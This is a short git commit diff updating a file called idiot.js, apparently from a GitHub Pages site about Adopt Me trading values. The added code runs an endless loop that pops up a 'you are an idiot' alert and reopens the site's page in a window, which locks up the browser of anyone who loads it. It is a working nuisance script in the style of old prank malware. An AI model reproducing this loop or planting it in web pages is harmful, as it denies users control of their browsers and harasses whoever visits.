a6c9e19b440c9569bfd41ef4e21ca5459b63dd43
AdoptMeTradingValues <108958603+AdoptMeTradingValues@users.noreply.github.com>
2022-09-23 12:11:03 -0400

    Update idiot.js

--- idiot.js
+++ idiot.js
@@ -1,3 +1,6 @@
+
+
 while (true) {
-            window.open(url, "_self" 'toolbar=0,location=0,menubar=0');
+            alert("you are an idiot");
+            window.open('https://adoptmetradingvalues.github.io/', 'toolbar=0,location=0,menubar=0');
 }
